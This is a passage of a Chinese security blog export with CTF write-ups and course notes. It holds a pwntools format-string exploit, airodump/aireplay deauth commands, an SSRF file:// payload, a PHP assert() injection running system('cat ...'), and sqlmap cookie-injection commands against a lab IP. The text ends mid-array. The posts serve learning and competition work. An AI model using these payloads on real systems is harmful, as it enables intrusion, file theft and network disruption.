[rbp-38h] __int64 *v4; // [rsp+38h] [rbp-28h] char *v5; // [rsp+40h] [rbp-20h] __int64 (__fastcall *v6)(_QWORD, _QWORD); // [rsp+48h] [rbp-18h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\"guess a number:\"); v3 = 0uLL; v5 = command; v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((char *)getshell + 317); readline((__int64)nptr, 0x18u); fd = open(\"/dev/random\", 0); read(fd, &amp;v3, 2uLL); read(fd, (char *)&amp;v3 + 8, 2uLL); v2 = atoi(nptr); v4 = &amp;v2; sleep(1u); printf(\"you guess \", (char *)&amp;v3 + 8); printf(nptr); printf(\" the answer is %lld \\n\", (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1)); if ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1) ) &#123; puts(\"GG!\"); exit(0); &#125; system(command); return __readfsqword(0x28u) ^ v7;&#125; 可以看到这里让我们猜测一个系统产生的随机数，猜对了就能getshell。再来看看pizza的exp： 12345678from pwn import *p = process('./messageboard')p.recvuntil('choice &gt;&gt;')p.sendline('4')p.recvuntil('guess a number:')payload = '%2$*11$s%2$*12$s%13$n'p.sendline(payload)p.interactive() 关于*：宽度与精度格式化参数可以忽略，或者直接指定，或者用星号”*“表示取对应函数参数的值。例如printf(&quot;%*d&quot;, 5, 10)输出”10“；printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)输出”abc“。 由此可知，第十一位和第十二位参数上存放的是随机数，第十三位则是我们的输入，这里将随机数的值写入我们的输入，达到getshell的目的。 堆的做法以后再来复现。 总结比赛打下来，发现实力是重要的一部分，同时经验、技巧（猥琐发育）以及运气都是重要的因素。希望下次有更多的机会参与线下AWD比赛。 参考网站https://www.jianshu.com/p/b8e448951125https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"XMan ELSE（二）","slug":"XMan-ELSE（二）","date":"2018-08-17T08:37:16.000Z","updated":"2019-02-28T08:04:31.616Z","comments":true,"path":"2018/08/17/XMan-ELSE（二）/","link":"","permalink":"https://qianfei11.github.io/2018/08/17/XMan-ELSE（二）/","excerpt":"了解无线攻击。","text":"了解无线攻击。 常见无线攻击威胁老旧的攻击WPA/WPA2-PSK 1234567891011iwconfigairodump-ng start wlan0airodump-ng check kill wlan0mon airodump-ngairodump-ng --bssid [mac addr] -c 11 -w xmantest wlan1monairodump-ng [filename] -w [dic file] Fake AP攻击Wifi-DOS攻击Deauth Flood：由于未加密的管理帧，允许接受第三方的解除关联帧。 123iwconfig wlan1mon channel 11airoplay -0 10000 -a [mac addr] -c [] wlan1mon 无线攻防的进阶ProbeRequest 暴露位置信息&amp;定位 SSID钓鱼 1wlan.fc.type_subtype==4 WPA-Radius企业无线攻防 EAP-TTLS&amp;&amp;PEAP— EAP-MD5 针对无线设备的漏洞挖掘攻击802.11客户端Fuzzing（模糊测试）是一种识别软件设计缺陷和安全漏洞的方法。 通过向目标发送畸形数据，试图使目标崩溃。 802.11-Fuzzing =&gt; 构造长度&gt;32 &amp;&amp; &lt;= 255byte SSID IE的payload wifi positioning SpoofWiFi定位原理： 每一个无线AP都有一个全球唯一的MAC地址，并且一般来说无线AP在一段时间内是不会移动的。 设备在开启Wi-Fi的情况下，即可扫描并收集周围的AP信号，无论是否加密，是否已连接，甚至信号强度不足以显示在无线信号列表中，都可以获取到AP广播出来的MAC地址。 设备将这些能够标示AP的数据发送到位置服务器，服务器检索出每一个AP的地理位置，并结合每个信号的强弱程度，计算出设备的地理位置并返回到用户设备。 位置服务商要不断更新、补充自己的数据库，以保证数据的准确性，毕竟无线AP不像基站塔那样基本100%不会移动。 无限攻击的识别与防御策略Identify DOS AttackDOS攻击有很多种，Authentiction Flood、De-Authentcation Flood、Association Flood、Beacon Flood等。 Identify Fake AP黑客先建立一个与你同SSID的热点，运用DOS Attack将合法Client强制断掉AP，当Client再次执行关联请求时，已经被劫持到Fake AP上，进行劫持，密码窃取等行为。","categories":[],"tags":[{"name":"is","slug":"is","permalink":"https://qianfei11.github.io/tags/is/"}]},{"title":"XMan Android（三）","slug":"XMan-Android（三）","date":"2018-08-16T08:58:20.000Z","updated":"2019-02-28T08:04:11.112Z","comments":true,"path":"2018/08/16/XMan-Android（三）/","link":"","permalink":"https://qianfei11.github.io/2018/08/16/XMan-Android（三）/","excerpt":"挖洞挖不动。","text":"挖洞挖不动。 Android底层安全框架及攻击缓释技术 自主访问限制 基于uid/gid 容易被突破 强制访问限制 SELinux 攻破非常困难 极大降低攻击后危害 验证启动模式（Verified Boot） 通过硬件密钥，逐步验证整个系统 一旦出厂之后，不可修改 修改之后系统无法启动 6.0开始支持，7.0后更加严格 代码签名和平台密钥 无法刷入任何非签名镜像 System级别的签名验证 Root相关基础知识 名词解释 Root？rwx之外的权限s位 Bootloader Recovery Baseband Android Root类型 永久Root 临时Root 取消Root Root方式 直接从Recovery刷入su和deamon-su 使用Bootloader替换Recovery后，刷入su/deamon-su 使用内核漏洞Exploit获取Root 常用工具 调试 IDA Pro gdb Android Studio HOOK Xposed Frida Magisk Canary、DEP、ASLR HeapSpray 信息泄漏漏洞 ROP 原声代码库及其攻击面 本地文件处理原声库 音频、视频处理 文档、字符、字体处理 可执行程序处理（APP安装过程） 其他文件处理（压缩文件，证书文件等） 具有远程攻击面的原生库（Brower，WIFI，BASEBAND，BT，NFC） 浏览器攻击面（DOM，JS）——chromium 网络数据处理（802.11包格式处理，其他网络控制数据包）——wpa_supplicant 基带处理（短信，电话）——radio.img 蓝牙（蓝牙数据包处理）——/system/bt 进程间通信及其他提权相关库（BINDER等） System Services adb shell service list 内核攻击面系统调用 系统调用有多少 ARM：256（android 8.0）263（android 7.x）258（android 6.x） ARM64：224（android 8.0）221（android 7.x）217（android 6.x） 系统调用可以做什么 理论上的所有操作，libc只是为了易用性的封装 理论上的所有权限，一般是设备上的最高权限 如何攻击 通过系统调用本身触发内核问题 通过系统调用让内核处理数据时发生问题 常见攻击场景 发送网络数据时触发问题，导致ROOT提权 越权写文件（dirtycow） 驱动、固件 驱动固件有多少 /dev中有228项（Android 6.0 Nexus 5） 驱动固件负责什么 适配特定硬件的软件 驱动程序会创建一些借口，允许用户从用户空间访问，以便控制硬件 如何攻击 让驱动固件处理数据时发生问题 虽然还是使用IOCTL系统调用，但是负责处理的不是原生内核 常见攻击场景 网络驱动处理数据时触发问题 声卡系统驱动、显示系统驱动 内核攻击和缓释相关技术 SELinux KASLR PXN、PAN kptr_restrict Page permission mitigation RKP DFI Android常用Fuzz方法 AFL：American Fuzzy Lop Syzkaller：系统调用Fuzzer","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://qianfei11.github.io/tags/android/"}]},{"title":"XMan ELSE（一）","slug":"XMan-ELSE（一）","date":"2018-08-15T01:23:36.000Z","updated":"2019-02-28T08:04:20.067Z","comments":true,"path":"2018/08/15/XMan-ELSE（一）/","link":"","permalink":"https://qianfei11.github.io/2018/08/15/XMan-ELSE（一）/","excerpt":"关于软件无线电和硬件安全入门。","text":"关于软件无线电和硬件安全入门。 SDR入门软件无线电（Software Defined Radio，SDR）是一种实现无线通信的新概念和体制。其中已在硬件被典型地实现的组件（例如混频器，滤波器，放大器，调制器 / 解调器，检测器等），也可以通过软件手段的个人计算机上或代替实施嵌入式系统。一开始应用在军事领域，在21世纪初，由于众多公司的努力，使得它已从军事领域转向民用领域，成为经济的、应用广泛的、全球通信的第三代移动通信系统的战略基础 无线电只能在特定频率发送。 TOOLS RTL2832U（电视棒）：高性能、低成本 HackRF BladeRF USRP 案例 民航通信通话解码 ADS-B信号伪造 逆向分析无线遥控信号 信号重放 信号监听、干扰、爆破 GSM短信嗅探 基站通信（伪基站） 气象卫星通信 Wifi破解 Wep加密 Pin码破解 Wpa Wifi万能钥匙 The way to be a hardware hacker电路计算机底层MOS管 NMOS CMOS：反相器 ==&gt; 非门 输入与非门：寄存器 输入或非门： 通信协议通用异步收发器（UART）一对一通信，TX/RX 数据帧结构： 1个起始位，固定为0 5-8个数据位 0-1个校验位，可以是奇校验，也可以是偶校验 1/1.5/2个停止位，固定为1 SPI串行外设接口，设备间有主从之分（M/S：Master/Slave） 一个单片机和一片FLASH的部分通信 SCLK：时钟 MOSI： MISO： CS：Chip Select 差分协议用两线间的电压代表逻辑 两线共同受加性噪声影响，电压差不变，免疫加性噪声 如USB、CAN PS：加性噪声 无系统简单程序设计12345678910#include &lt;89c51.h&gt;int main(void)&#123; LED_Init(); while(1) &#123; LED_Toggle(); Delay(1000); &#125;&#125; main永不return 没有多进程 系统中断服务函数全手动重载 模块先初始化再使用，常与硬件相关 例程往往比文档好用 调试器BUG LED_On替代console.log unsigned char s[256]会爆内存","categories":[],"tags":[{"name":"is","slug":"is","permalink":"https://qianfei11.github.io/tags/is/"}]},{"title":"XMan Android（二）","slug":"XMan-Android（二）","date":"2018-08-13T13:17:34.000Z","updated":"2019-02-28T08:04:03.323Z","comments":true,"path":"2018/08/13/XMan-Android（二）/","link":"","permalink":"https://qianfei11.github.io/2018/08/13/XMan-Android（二）/","excerpt":"关于Android方面的漏洞挖掘。","text":"关于Android方面的漏洞挖掘。 Android应用层安全模型文件存储 内部存储 保存应用的私有文件，随应用卸载而删除 应用的私有缓存数据 外部存储 全局范围内可读写，需要申请EXTERNAL_STORAGE权限 外置存储 可移除Sdcard 私有存储 公共存储 使用内部存储 内部存储写文件 读文件 缓存文件 外部存储 获取权限 使用getExternalStorageState()检查存储介质是否可用 获取公共目录 保存私有文件 应用私有目录 /data/data/appname/ database cache files lib shared_prefs 应用沙箱 应用安装阶段，自动给每个应用分配UID、关联UID 应用以UID运行 每个应用都有只有它可读写的专用数据目录 root用户的UID为0 系统服务UID从1000开始，system用户UID为1000，应用程序UID从10000到19999 同签名应用程序可以使用同一个UID安装、从而共享文件 权限 安装时申请，之后不能改变，除非动态申请 应用通过在AndroidManifest.xml文件内添加标签来申请权限 标签定义新权限 包管理器通过维护/data/system/packages.xml文件来管理应用权限等信息 权限保护级别 Normal Dangerous Signature SignatureOrSystem Android App剖析 META-INF/ res/ lib/ AndroidManifest.xml classes.dex resources.arsc Android应用组件等介绍四大组件 Activity Service Content Provider Broadcast Activity返回栈 应用一般包含很多Activity，它们按照各自打开的顺序排列在返回栈（Back Stack）中，这些Activity统称为Task 当前一个Activity启动一个新的Activity的时候，新的Activity会被加入返回栈中，并处于栈顶 当用户返回的时候，当前处于栈顶的Activity会从返回栈中弹出，并被销毁（onDestroy），恢复前一个Activity的状态 Activity启动模式 Standard singleTop singleTask singleInstance 常用分析方法及工具流量分析 分析HTTP/HTTPS流量 Burp suite Charles Fiddler 更多种流量 Tcpdump Wireshark 静态分析 Apktool Dex2jar Jd-gui Baksmali JEB2 IDA 常见漏洞 MIMT WebView SQL Web API 越权 路径穿越 私有数据泄漏 本地开放端口 DOS 二进制漏洞 挖掘方法及相关工具方法 功能场景分析 特征漏洞检查 工具+人工 工具 QARK Mobile-Security-Framework-MobSF Janus FlowDroid Drozer","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://qianfei11.github.io/tags/android/"}]},{"title":"2018-XMan个人排位赛-review","slug":"【未完成】2018-XMan个人排位赛-review","date":"2018-08-11T12:18:08.000Z","updated":"2019-01-26T08:05:28.916Z","comments":true,"path":"2018/08/11/【未完成】2018-XMan个人排位赛-review/","link":"","permalink":"https://qianfei11.github.io/2018/08/11/【未完成】2018-XMan个人排位赛-review/","excerpt":"唉pwn还是没有入门。","text":"唉pwn还是没有入门。 MISCFILE用DiskGenius恢复磁盘： XMAN通行证不同的网站解密结果竟然不一样。最后发现这个网站还行。 1a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg== 第一眼就知道先是base64： 1kanbbrgghjl&#123;zb____&#125;vtlaln 栅栏7栏加密： 1kzna&#123;blnl_abj_lbh_trg_vg&#125; 凯撒位移13位得到flag： 1xman&#123;oyay_now_you_get_it&#125; PPAP用wireshark打开，搜索关键字flag，很容易找到一串base64： 经过分析以后，具体结构应该是这样的： 123456789101112131415yaaaaaaaar, land ho! Hey wesley, you got that flag?Ayy, I got yer files right here, matey! [base64&apos;d jpg] [base64&apos;d flag.zip]And here be the map to the booty! [base64&apos;d Haar cascade] I don&apos;t understand, this isn&apos;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!Lastly, if ye sail the seven seas, you do be a pirate! jpg文件和zip文件之间通过等号判断分隔。通过python得到三个文件： 123456789# exampleimport base64f1 = open('b1', 'r')enc1 = f1.read()f2 = open('b1.jpg', 'w')out = base64.b64decode(enc1)f2.write(out)f1.close()f2.close() 然后又通过binwalk发现，这里输出的jpg图片其实不止一张。用foremost输出所有的图片。 下面用了官方的脚本，用opencv找出数百张图片的其中一张来得到密码： 12345678910111213141516171819202122232425import osimport sysimport cv2# Get all of the picturesimgs = os.listdir('jpg')# Cascade we'll be using for detectioncascade = cv2.CascadeClassifier('b3.xml')# From the cluesscaling_factor = 1.02min_neighbors = 10 # Bumped this up until one pic was leftfor img_name in imgs: # Load the image and run the cascade img = cv2.imread(os.path.join('jpg', img_name)) detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors) if len(detect) &gt; 0: for (x, y, w, h) in detect: # X marks the spot! cv2.line(img, (x, y), (x + w, y + h), (255, 0, 0), 2) cv2.line(img, (x, y + h), (x + w, y), (255, 0, 0), 2) # Save the new image cv2.imwrite(os.path.join('detected', img_name), img) 最后得到一张海盗的图片，容易知道密码应该是skullandcrossbones，得到flag。 AUTOKEY一个pcap包，都是usb流量，通过tshark提取出来： 12 ⚡ root@kali  ~/Desktop  tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; usbdata.txtRunning as user \"root\" and group \"root\". This could be dangerous. 查看后发现都是八个字节的数据，那么应该是键盘流量，用脚本跑出来： 1234567891011121314151617181920#!usr/bin/env python#-*- coding:utf-8 -*-mappings = &#123; 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" &#125;nums = []keys = open('usbdata.txt')for line in keys: if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': continue nums.append(int(line[6:8],16))keys.close()output = \"\"for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += '[unknown]'print 'output :\\n' + output 出来的结果： 12output :[unknown]A[unknown]UTOKEY&apos;&apos;.DECIPHER&apos;[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ&apos; 去掉[uuknown]，[DEL]则是去掉后一个字符，得到： 12output :AUTOKEY&apos;&apos;.DECIPHER&apos;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&apos; 百度一下autokey，用github上找到的的爆破脚本得到flag。 123-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLFHELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF WEBSIMPLE SSRFhint里提示curl还有flag在/etc/flag.txt，大概是通过file协议读取本地文件。payload： 1file://www.baidu.com/etc/flag.txt# MAKEIT网页上提示了git，猜测存在.git文件泄露，把源码下载下来之后审计： 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; 这里有assert()，可以执行函数中的命令，通过构造闭合前面的strpos()绕过，来得到templates/flag.php中的内容： 11&apos;, &apos;..&apos;) or system(&apos;cat templates/flag.php&apos;); // BBSQLIcookie注入，PHPSESSID拿下来： 用sqlmap跑： 123456// 跑表名python sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --table --level 2// 跑列名python sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --columns -T '[GDJM_flag]' --level 2// 跑flagpython sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --dump -T '[GDJM_flag]' -C 'flag' --level 2 PS：不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。 REDRAGON QUEST和csaw的那道wyvern很像，可以用angr跑出来： 12345678910111213141516171819202122232425262728#!/usr/bin/env pythonimport angrimport claripyp = angr.Project('xman_task1')flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(28)] # flag's length is 28, every char is 8 bitflag = claripy.Concat(*flag_chars + [claripy.BVV(b'\\n')]) # end with '\\n'st = p.factory.full_init_state( args=['./xman_task1'], # arguments add_options=angr.options.unicorn, stdin=flag, # flag as input)for k in flag_chars: st.solver.add(k != 0) # char is not 0 st.solver.add(k != 10) # char is not '\\n'sm = p.factory.simulation_manager(st)sm.run()out = b''for pp in sm.deadended: out = pp.posix.dumps(1) if b'flag&#123;' in out: out = next(filter(lambda s: b'flag&#123;' in s, out.split())) breakprint 'flag:', out pizza大佬提供了另一种思路。先用ida-python去混淆： 1234567891011121314151617181920import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytesdef do_patch(ea): if(get_bytes(ea, 1) == \"\\x8B\"): # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\") elif(get_bytes(ea, 2) == \"\\x44\\x8B\"): # mov r8d-r15d, dword reg = (ord(get_bytes(ea + 2, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea + 1, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\")for addr in xrange(0x610318, 0x6105AC, 4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,\"-\")) while(ref != ida_idaapi.BADADDR): do_patch(ref) print(\"patch at \" + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print(\"-\"*20) 最后脚本： 12345678secret = [100, 214, 266, 369, 417, 527, 622, 733, 847, 942, 1054, 1106, 1222, 1336, 1441, 1540, 1589, 1686, 1796, 1891, 1996, 2112, 2165, 2260, 2336, 2412, 2498, 2575]n = 0flag = \"\"for i in xrange(0, len(secret)): ch = secret[i] - n n += ch flag += chr(ch)print(flag) EASYWASMgithub上找到一个将wasm转成c的工具：https://github.com/WebAssembly/wabt 命令：wasm2c easywasm.wasm -o easywasm.c 主要部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185...static void _md5(u32 p0, u32 p1, u32 p2) &#123; ...&#125;static u32 _check(u32 p0) &#123; ...&#125;...static const u8 data_segment_data_0[] = &#123; 0x35, 0x36, 0x32, 0x66, 0x65, 0x33, 0x63, 0x63, 0x35, 0x30, 0x30, 0x31, 0x34, 0x63, 0x32, 0x36, 0x30, 0x64, 0x39, 0x65, 0x38, 0x63, 0x66, 0x34, 0x65, 0x64, 0x33, 0x38, 0x63, 0x37, 0x37, 0x61, 0x00, 0x63, 0x30, 0x32, 0x32, 0x61, 0x64, 0x30, 0x63, 0x63, 0x30, 0x30, 0x37, 0x35, 0x61, 0x39, 0x61, 0x62, 0x31, 0x34, 0x62, 0x34, 0x31, 0x32, 0x61, 0x31, 0x30, 0x38, 0x32, 0x64, 0x35, 0x66, 0x33, 0x00, 0x36, 0x34, 0x63, 0x32, 0x38, 0x36, 0x63, 0x66, 0x63, 0x36, 0x32, 0x33, 0x61, 0x61, 0x38, 0x64, 0x37, 0x64, 0x66, 0x37, 0x63, 0x30, 0x38, 0x38, 0x65, 0x62, 0x66, 0x37, 0x64, 0x37, 0x31, 0x38, 0x00, 0x38, 0x33, 0x36, 0x36, 0x34, 0x62, 0x64, 0x65, 0x65, 0x34, 0x62, 0x36, 0x31, 0x33, 0x62, 0x37, 0x65, 0x37, 0x61, 0x35, 0x31, 0x62, 0x35, 0x32, 0x31, 0x33, 0x34, 0x37, 0x30, 0x61, 0x38, 0x64, 0x00, 0x62, 0x30, 0x32, 0x30, 0x62, 0x66, 0x35, 0x39, 0x38, 0x61, 0x61, 0x61, 0x32, 0x62, 0x33, 0x65, 0x30, 0x33, 0x65, 0x64, 0x30, 0x32, 0x63, 0x38, 0x35, 0x34, 0x33, 0x36, 0x32, 0x36, 0x38, 0x61, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x63, 0x32, 0x33, 0x31, 0x64, 0x36, 0x30, 0x37, 0x62, 0x36, 0x38, 0x32, 0x33, 0x66, 0x64, 0x30, 0x61, 0x36, 0x38, 0x65, 0x38, 0x31, 0x33, 0x37, 0x36, 0x30, 0x38, 0x30, 0x39, 0x37, 0x35, 0x34, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x61, 0x30, 0x31, 0x38, 0x34, 0x66, 0x38, 0x32, 0x34, 0x30, 0x65, 0x32, 0x66, 0x65, 0x34, 0x36, 0x38, 0x36, 0x31, 0x64, 0x63, 0x38, 0x64, 0x31, 0x35, 0x61, 0x38, 0x31, 0x39, 0x63, 0x62, 0x30, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x66, 0x33, 0x33, 0x34, 0x36, 0x34, 0x66, 0x62, 0x34, 0x37, 0x31, 0x63, 0x34, 0x36, 0x61, 0x62, 0x61, 0x66, 0x36, 0x39, 0x31, 0x63, 0x30, 0x30, 0x30, 0x61, 0x30, 0x65, 0x33, 0x30, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x39, 0x62, 0x33, 0x37, 0x64, 0x62, 0x30, 0x39, 0x31, 0x39, 0x37, 0x39, 0x62, 0x65, 0x64, 0x66, 0x30, 0x30, 0x61, 0x37, 0x30, 0x39, 0x35, 0x38, 0x35, 0x31, 0x62, 0x61, 0x36, 0x66, 0x35, 0x39, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 